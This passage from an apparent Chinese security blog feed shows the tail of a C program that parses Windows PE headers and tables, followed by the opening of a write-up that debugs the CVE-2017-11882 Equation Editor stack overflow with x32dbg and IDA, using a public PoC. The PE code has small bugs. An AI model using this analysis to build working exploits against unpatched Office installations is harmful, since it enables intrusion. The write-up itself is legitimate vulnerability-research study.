<span class="keyword">sizeof</span>(<span class="type">char</span>) + <span class="number">1</span>;</span><br><span class="line">buffer = (<span class="type">char</span> *)<span class="built_in">malloc</span>(imageLength);</span><br><span class="line"><span class="built_in">memset</span>(buffer, <span class="number">0</span>, nFileLength * <span class="keyword">sizeof</span>(<span class="type">char</span>) + <span class="number">1</span>);</span><br><span class="line">fread(buffer, <span class="number">1</span>, imageLength, pFile);</span><br><span class="line"></span><br><span class="line"><span class="comment">// DOS头解析</span></span><br><span class="line">PIMAGE_DOS_HEADER Read_Dos_Header;</span><br><span class="line">Read_Dos_Header = (PIMAGE_DOS_HEADER)buffer;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;--- MS DOS HEADER ---\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;DOS标志位：%x\n&quot;</span>, Read_Dos_Header-&gt;e_magic);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;PE头偏移：%x\n\n&quot;</span>, Read_Dos_Header-&gt;e_lfanew);</span><br><span class="line"></span><br><span class="line"><span class="comment">// PE头解析</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;--- PE HEADER ---\n&quot;</span>);</span><br><span class="line">PIMAGE_NT_HEADERS Read_NT_Headers;<span class="comment">// PE头，包含标准PT头和扩展PE头</span></span><br><span class="line">Read_NT_Headers = (PIMAGE_NT_HEADERS)(buffer + Read_Dos_Header-&gt;e_lfanew);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;PE标志位：%x\n&quot;</span>, Read_NT_Headers-&gt;Signature);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;运行平台：%x\n&quot;</span>, Read_NT_Headers-&gt;FileHeader.Machine);<span class="comment">// FileHeader: 标准头</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;程序入口点：%x\n\n&quot;</span>, Read_NT_Headers-&gt;OptionalHeader.ImageBase);<span class="comment">// OptionalHeader：扩展头</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 区段解析遍历, 根据标准PE头中的NumberOfSections进行遍历</span></span><br><span class="line">PIMAGE_SECTION_HEADER Read_Section_Header = IMAGE_FIRST_SECTION(Read_NT_Headers);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;--- Section HEADER ---\n&quot;</span>);</span><br><span class="line">PIMAGE_FILE_HEADER PFileHeder = &amp;(Read_NT_Headers-&gt;FileHeader);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PFileHeder-&gt;NumberOfSections; ++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Name(区段名)：%s\n&quot;</span>, Read_Section_Header[i].Name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;VOffset(起始的相对虚拟地址)：%08X\n&quot;</span>, Read_Section_Header[i].VirtualAddress);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;VSize(内存区段大小)：%08X\n&quot;</span>, Read_Section_Header[i].SizeOfRawData);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ROffset(文件偏移)：%08X\n&quot;</span>, Read_Section_Header[i].PointerToRawData);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;RSize(文件区段大小)：%08X\n&quot;</span>, Read_Section_Header[i].Misc.VirtualSize);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;标记(区段属性)：%08X\n\n&quot;</span>, Read_Section_Header[i].Characteristics);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;---导入表信息---\n&quot;</span>);</span><br><span class="line">ImportTbale(buffer);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;---导入表信息---\n&quot;</span>);</span><br><span class="line">ExportTable(buffer);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*printf(&quot;---重定位表信息---\n&quot;);</span></span><br><span class="line"><span class="comment">RelocTable(buffer);*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;---TLS表信息---\n&quot;</span>);</span><br><span class="line">TLSTable(buffer);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;---延迟导入表表信息---\n&quot;</span>);</span><br><span class="line">DelayImport(buffer);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(buffer);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 地址转换函数</span></span><br><span class="line"><span class="comment">// dwRva是某个数据目录表项的VirutualAddress</span></span><br><span class="line"><span class="comment">// buffer是读取到的PE文件缓冲区</span></span><br><span class="line">DWORD <span class="title function_">RvaToOffset</span><span class="params">(DWORD dwRva, <span class="type">char</span> *buffer)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// DOS头</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)buffer;</span><br><span class="line"></span><br><span class="line"><span class="comment">// PE头</span></span><br><span class="line">PIMAGE_NT_HEADERS pNT = (PIMAGE_NT_HEADERS)(buffer + pDos-&gt;e_lfanew);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 区段表</span></span><br><span class="line">PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNT);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断是否落在头部中</span></span><br><span class="line"><span class="keyword">if</span> (dwRva &lt; pSection[<span class="number">0</span>].VirtualAddress)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> dwRva;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pNT-&gt;FileHeader.NumberOfSections; ++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// VirtualAddress：起始地址</span></span><br><span class="line"><span class="comment">// Size：长度</span></span><br><span class="line"><span class="comment">// VirtualAddress+Size：结束地址</span></span><br><span class="line"><span class="comment">// 判断是否落在某个区段内</span></span><br><span class="line"><span class="keyword">if</span> (dwRva &gt;= pSection[i].VirtualAddress &amp;&amp; dwRva &lt;= pSection[i].VirtualAddress + pSection[i].Misc.VirtualSize)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// dwRva - pSection[i].VirtualAddress对应数据目录表起始地址到区段起始地址的偏移Offset</span></span><br><span class="line"><span class="comment">// pSection[i].PointerToRawData: 区段到文件头的偏移Offset</span></span><br><span class="line"><span class="comment">// 返回数据目录表起始地址到文件头的偏移Offset</span></span><br><span class="line"><span class="keyword">return</span> dwRva - pSection[i].VirtualAddress + pSection[i].PointerToRawData;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ImportTbale</span><span class="params">(<span class="type">char</span> *buffer)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// DOS头</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)buffer;</span><br><span class="line"></span><br><span class="line"><span class="comment">// PE头</span></span><br><span class="line">PIMAGE_NT_HEADERS pNT = (PIMAGE_NT_HEADERS)(buffer + pDos-&gt;e_lfanew);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定位导入表</span></span><br><span class="line">PIMAGE_DATA_DIRECTORY pImoprtDir = (PIMAGE_DATA_DIRECTORY)(pNT-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_IMPORT);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 填充结构</span></span><br><span class="line">PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)(RvaToOffset(pImoprtDir-&gt;VirtualAddress, buffer) + buffer);</span><br><span class="line"><span class="keyword">while</span> (pImport-&gt;Name != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> *szDllName = (<span class="type">char</span> *)(RvaToOffset(pImport-&gt;Name, buffer) + buffer);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;DLL名称: %s\n&quot;</span>, szDllName);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;日期时间标志: %08x\n&quot;</span>, pImport-&gt;TimeDateStamp);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ForwarderChain: %08x\n&quot;</span>, pImport-&gt;ForwarderChain);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;名称OFFSET: %08x\n&quot;</span>, pImport-&gt;Name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;FirstThunk: %08x\n&quot;</span>, pImport-&gt;FirstThunk);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;OriginalFirstThunk: %08x\n\n&quot;</span>, pImport-&gt;OriginalFirstThunk);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指向导入地址表的RVA</span></span><br><span class="line">PIMAGE_THUNK_DATA pIat = (PIMAGE_THUNK_DATA)(RvaToOffset(pImport-&gt;OriginalFirstThunk, buffer) + buffer);</span><br><span class="line">DWORD index = <span class="number">0</span>;</span><br><span class="line">DWORD ImportOffset = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// 被导入函数的序号</span></span><br><span class="line"><span class="keyword">while</span> (pIat-&gt;u1.Ordinal != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ThunkRva: %08x\n&quot;</span>, pImport-&gt;OriginalFirstThunk + index);</span><br><span class="line">ImportOffset = RvaToOffset(pImport-&gt;OriginalFirstThunk, buffer);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ThunkOffset: %08x\n&quot;</span>, ImportOffset + index);</span><br><span class="line">index += <span class="number">4</span>;</span><br><span class="line"><span class="keyword">if</span> ((pIat-&gt;u1.Ordinal &amp; <span class="number">0x80000000</span>) != <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">PIMAGE_IMPORT_BY_NAME pName = (PIMAGE_IMPORT_BY_NAME)(RvaToOffset(pIat-&gt;u1.AddressOfData, buffer) + buffer);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;API名称：%s\n&quot;</span>, pName-&gt;Name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hint(API序号)：%04x\n&quot;</span>, pName-&gt;Hint);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ThunkValue：%08x\n\n&quot;</span>, pIat-&gt;u1.Function);<span class="comment">// 被导入函数的地址</span></span><br><span class="line">&#125;</span><br><span class="line">pIat++;</span><br><span class="line">&#125;</span><br><span class="line">pImport++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ExportTable</span><span class="params">(<span class="type">char</span> *buffer)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// DOS头</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)buffer;</span><br><span class="line"></span><br><span class="line"><span class="comment">// PE头</span></span><br><span class="line">PIMAGE_NT_HEADERS pNT = (PIMAGE_NT_HEADERS)(buffer + pDos-&gt;e_lfanew);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定位数据目录表中的导出表</span></span><br><span class="line">PIMAGE_DATA_DIRECTORY pExportDir = pNT-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_EXPORT;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 填充导出表结构</span></span><br><span class="line">PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(RvaToOffset(pExportDir-&gt;VirtualAddress, buffer) + buffer);</span><br><span class="line"><span class="type">char</span> *szName = (<span class="type">char</span> *)(RvaToOffset(pExport-&gt;Name, buffer) + buffer);</span><br><span class="line"><span class="keyword">if</span> (pExport-&gt;AddressOfFunctions == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;当前没有导出表!\n\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;导出表OFFSET：%08x\n&quot;</span>, RvaToOffset(pExportDir-&gt;VirtualAddress, buffer));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;特征值：%08x\n&quot;</span>, pExport-&gt;Characteristics);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;基数：%08x\n&quot;</span>, pExport-&gt;Base);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;名称OFFSET：%08x\n&quot;</span>, pExport-&gt;Name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;名称：%s\n&quot;</span>, szName);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;函数数量：%08x\n&quot;</span>, pExport-&gt;NumberOfFunctions);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;函数名数量：%08x\n&quot;</span>, pExport-&gt;NumberOfNames);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;函数地址：%08x\n&quot;</span>, pExport-&gt;AddressOfFunctions);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;函数名地址：%08x\n&quot;</span>, pExport-&gt;AddressOfNames);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;函数名称序号地址：%08x\n&quot;</span>, pExport-&gt;AddressOfNameOrdinals);</span><br><span class="line"><span class="comment">// 函数数量</span></span><br><span class="line">DWORD dwNumOfFun = pExport-&gt;NumberOfFunctions;</span><br><span class="line"><span class="comment">// 函数名数量</span></span><br><span class="line">DWORD dwNumOfNames = pExport-&gt;AddressOfNames;</span><br><span class="line"><span class="comment">// 基数</span></span><br><span class="line">DWORD dwBase = pExport-&gt;Base;</span><br><span class="line"><span class="comment">// 导出地址表</span></span><br><span class="line">PDWORD pEat32 = (PDWORD)(RvaToOffset(pExport-&gt;AddressOfFunctions, buffer) + buffer);</span><br><span class="line"><span class="comment">// 导出名称表</span></span><br><span class="line">PDWORD pEnt32 = (PDWORD)(RvaToOffset(pExport-&gt;AddressOfNames, buffer) + buffer);</span><br><span class="line"><span class="comment">// 导出序号表</span></span><br><span class="line">PWORD pId = (PWORD)(RvaToOffset(pExport-&gt;AddressOfNameOrdinals, buffer) + buffer);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; dwNumOfFun; ++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (pEat32[i] == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">DWORD Id = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (; Id &lt; dwNumOfNames; ++Id)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (pId[Id] == i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (Id == dwNumOfNames)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Id: %x Address: 0x%08x Name[NULL]\n&quot;</span>, i + dwBase, pEat32[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> *szFunName = (<span class="type">char</span> *)(RvaToOffset(pEnt32[Id], buffer) + buffer);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Id: %x Address: 0x%08x Name[%s]\n&quot;</span>, i + dwBase, pEat32[i], szFunName);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">RelocTable</span><span class="params">(<span class="type">char</span> *buffer)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">TYPE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">WORD Offset  :  <span class="number">12</span>;</span><br><span class="line">WORD Type : <span class="number">4</span>;<span class="comment">// 4bit</span></span><br><span class="line">&#125;TYPE, *PTYPE;</span><br><span class="line"></span><br><span class="line"><span class="comment">// DOS头</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)buffer;</span><br><span class="line"></span><br><span class="line"><span class="comment">// PE头</span></span><br><span class="line">PIMAGE_NT_HEADERS pNT = (PIMAGE_NT_HEADERS)(buffer + pDos-&gt;e_lfanew);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定位重定位表</span></span><br><span class="line">PIMAGE_DATA_DIRECTORY pRelocDir = (pNT-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_BASERELOC);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 填充重定位表的结构</span></span><br><span class="line">PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)(RvaToOffset(pRelocDir-&gt;VirtualAddress, buffer) + buffer);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定位区段</span></span><br><span class="line">PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNT);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (pReloc-&gt;SizeOfBlock != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 找到本0x1000字节的起始位置</span></span><br><span class="line">DWORD dwCount = (pReloc-&gt;SizeOfBlock - <span class="number">8</span>) / <span class="number">2</span>;<span class="comment">// 需要重定位的个数</span></span><br><span class="line">DWORD dwRva = (pReloc-&gt;VirtualAddress);</span><br><span class="line">PTYPE pRelocArr = (PTYPE)(pReloc + <span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;区段: %s\n&quot;</span>, pSection-&gt;Name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;RVA: %08x\n&quot;</span>, dwRva);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;项目: %X H / %d\n&quot;</span>, pReloc-&gt;SizeOfBlock, pReloc-&gt;SizeOfBlock);<span class="comment">// 进制不同</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 找到下一个0x1000字节的结构体</span></span><br><span class="line">pReloc = (PIMAGE_BASE_RELOCATION)((<span class="type">char</span> *)pReloc + pReloc-&gt;SizeOfBlock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; dwCount; ++i)</span><br><span class="line">&#123;</span><br><span class="line">PDWORD pData = (PDWORD)(RvaToOffset(pRelocArr[i].Offset + dwRva, buffer) + buffer);</span><br><span class="line">DWORD pDataOffset = RvaToOffset(pRelocArr[i].Offset + dwRva, buffer);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;RVA: %08x\n&quot;</span>, pRelocArr[i].Offset + dwRva);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;区段: %08x\n&quot;</span>, *pData);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;偏移: %08x\n\n&quot;</span>, pDataOffset);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">TLSTable</span><span class="params">(<span class="type">char</span> *buffer)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// DOS头</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)buffer;</span><br><span class="line"></span><br><span class="line"><span class="comment">// PE头</span></span><br><span class="line">PIMAGE_NT_HEADERS pNT = (PIMAGE_NT_HEADERS)(buffer + pDos-&gt;e_lfanew);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定位数据目录表中的TLS表</span></span><br><span class="line">PIMAGE_DATA_DIRECTORY pTLSDir = (pNT-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_TLS);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 填充TLS结构</span></span><br><span class="line">PIMAGE_TLS_DIRECTORY pTLS = (PIMAGE_TLS_DIRECTORY)(RvaToOffset(pTLSDir-&gt;VirtualAddress, buffer) + buffer);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;数据块开始VA：%08x\n&quot;</span>, pTLS-&gt;StartAddressOfRawData);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;数据块结束VA：%08x\n&quot;</span>, pTLS-&gt;EndAddressOfRawData);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;索引变量VA：%08x\n&quot;</span>, pTLS-&gt;AddressOfIndex);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;回调表VA：%08x\n&quot;</span>, pTLS-&gt;AddressOfCallBacks);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;填0大小：%08x\n&quot;</span>, pTLS-&gt;SizeOfZeroFill);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;特征值：%08x\n\n&quot;</span>, pTLS-&gt;Characteristics);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DelayImport</span><span class="params">(<span class="type">char</span> *buffer)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// DOS头</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)buffer;</span><br><span class="line"></span><br><span class="line"><span class="comment">// PE头</span></span><br><span class="line">PIMAGE_NT_HEADERS pNT = (PIMAGE_NT_HEADERS)(buffer + pDos-&gt;e_lfanew);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定位数据目录表中的延迟导入表</span></span><br><span class="line">PIMAGE_DATA_DIRECTORY pDelayLoadDir = (pNT-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 填充延迟导入表的数据结构</span></span><br><span class="line">PIMAGE_DELAYLOAD_DESCRIPTOR pDelayLoad = (PIMAGE_DELAYLOAD_DESCRIPTOR)(RvaToOffset(pDelayLoadDir-&gt;VirtualAddress, buffer) + buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (pDelayLoad-&gt;DllNameRVA != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> *szDllName = (<span class="type">char</span> *)(RvaToOffset(pDelayLoad-&gt;DllNameRVA, buffer) + buffer);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;DllName: %s\n&quot;</span>, szDllName);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Attributes: %08X\n&quot;</span>, pDelayLoad-&gt;Attributes);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ModuleHandleRVA: %08X\n&quot;</span>, pDelayLoad-&gt;ModuleHandleRVA);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ImportAddressTableRVA: %08X\n&quot;</span>, pDelayLoad-&gt;ImportAddressTableRVA);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ImportNameTableRVA: %08X\n&quot;</span>, pDelayLoad-&gt;ImportNameTableRVA);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;BoundImportAddressTableRVA: %08X\n&quot;</span>, pDelayLoad-&gt;BoundImportAddressTableRVA);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;UnloadInformationTableRVA: %08X\n&quot;</span>, pDelayLoad-&gt;UnloadInformationTableRVA);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;TimeDateStamp: %08X\n\n&quot;</span>, pDelayLoad-&gt;TimeDateStamp);</span><br><span class="line">pDelayLoad++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PE结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2017-11882原理、复现和Poc解析利用</title>
      <link href="/post/87db0641.html"/>
      <url>/post/87db0641.html</url>
      
        <content type="html"><![CDATA[<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul><li>Office 365   </li><li>Microsoft Office 2000   </li><li>Microsoft Office 2003   </li><li>Microsoft Office 2007 Service Pack 3   </li><li>Microsoft Office 2010 Service Pack 2   </li><li>Microsoft Office 2013 Service Pack 1   </li><li>Microsoft Office 2016</li></ul><h2 id="漏洞原理分析："><a href="#漏洞原理分析：" class="headerlink" title="漏洞原理分析："></a>漏洞原理分析：</h2><p><strong>参考文章</strong>：<a href="https://www.cnblogs.com/HsinTsao/p/15408412.html">CVE-2017-11882 漏洞分析总结</a></p><p>注：没给链接的工具可以网上搜搜，很多的</p><h3 id="定位漏洞程序"><a href="#定位漏洞程序" class="headerlink" title="定位漏洞程序"></a>定位漏洞程序</h3><ol><li>打开能弹出计算器的<a href="https://github.com/embedi/CVE-2017-11882">poc文档</a>：<ul><li>使用processhacker分析进程状态，发现calc由cmd打开，但是cmd却没有父进程，这不正常，至少有一个程序负责拉起cmd</li><li>使用pchunter查找父进程得到其PID但是找不到具体是什么</li><li>重新打开poc文档，pchunter得到PID + process monitor的树形控件定位到cmd父进程为EQNEDT32.exe</li></ul></li><li><p>注册表新建<strong>ENQEDT32.EXE</strong>并设置x32dbg为即时调试器(详细方法看文末的解决方案)</p></li><li><p>由于poc代码可以弹出计算器，猜测漏洞函数为<code>WinExec</code>或者<code>CreateProcess</code>之类的API</p></li></ol><h3 id="调试漏洞程序"><a href="#调试漏洞程序" class="headerlink" title="调试漏洞程序"></a>调试漏洞程序</h3><p>打开poc文档，弹出x32dbg，<code>ctrl + G</code>定位<code>WinExec</code>位置并下断点</p><p>运行到断点，查看堆栈，找到函数的返回值<strong>00430C18</strong>，去看看</p><p><img src="https://s1.ax1x.com/2023/07/20/pCHaUyV.png" alt=""></p><p><img src="https://s1.ax1x.com/2023/07/20/pCHaweU.png" alt=""></p><p>上图是调用<code>WinExec</code>的地方，我们再看看是哪里转到这里来的，直接查看堆栈即可，找比刚刚地址更高的返回位置</p><p><strong>注：</strong>栈由高地址向低地址增长，所以前一个函数的返回地址应该在高地址</p><p><img src="https://s1.ax1x.com/2023/07/20/pCHaaLT.png" alt=""></p><p>去看看<strong>004218E4</strong>：</p><p><img src="https://s1.ax1x.com/2023/07/20/pCHa0wF.png" alt=""></p><p>可以看到，调用的函数是<strong>4115A7</strong>，使用IDA静态分析这个函数(直接按<code>g</code>输入地址)，<code>F5</code>反汇编：</p><p><img src="https://s1.ax1x.com/2023/07/20/pCHaNQ0.png" alt=""></p><p><code>strlen</code>、<code>strcmp</code>都不可能导致栈溢出，所以推测应该是<strong>sub_41160F</strong>有问题，去看看：</p><p><img src="https://s1.ax1x.com/2023/07/20/pCHarFJ.png" alt=""></p><p>通读，发现第18行<code>strcpy</code>没有使用安全函数并且没有对<code>a1</code>的长度进行校验，对比汇编窗口的<strong>rep movsd</strong>语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 注意！32位不同于8086，不需要段寄存器，edi、esi直接就定位内存中的地址</span><br><span class="line">rep movsb# 重复ecx次，每次将一个字节从esi到 edi</span><br><span class="line">rep movsw# 重复ecx次，每次将一个字从esi到 edi</span><br><span class="line">rep movsd# 重复ecx次，每次将两个字从esi到 edi</span><br><span class="line"></span><br><span class="line"># 执行完上述操作以后会对esi和edi进行修改：</span><br><span class="line"># DF = 0：esi和edi递增</span><br><span class="line"># DF = 1：esi和edi递减</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">repne scasb</span><br><span class="line"># 作用：查看目标字符串是否含有某个字符</span><br><span class="line"># rep就是repeate重复，ne就是not equal不相等；所以该指令的意思就是ecx != 0(即循环未结束)并且后面的两个值不相等(即ZF != 0)</span><br><span class="line"># scasb就是比较[edi]和al是否相等，会改变ZF的值；此外，还会依照如下规则修改edi的值：</span><br><span class="line"># DF = 0：inc edi</span><br><span class="line"># DF = 1：dec edi</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2023/07/20/pCHaBo4.png" alt="image-20230719061155032"></p><p>回到<strong>x32dbg</strong>动态分析<strong>sub_41160F</strong>，给函数入口点和溢出点下断点，<strong>同时要对Win32Exec和之前提到的4115A7下断点</strong>:</p><p><img src="https://s1.ax1x.com/2023/07/20/pCHacS1.png" alt=""></p><p>进入函数，重点关注函数的返回地址是否被覆盖，这里我使用了监视进行查看：</p><p><strong>注：</strong>函数的返回地址就是进入这个函数之后<code>push ebp</code>还未执行时<code>ESP</code>所指向的地址的数据</p><p><img 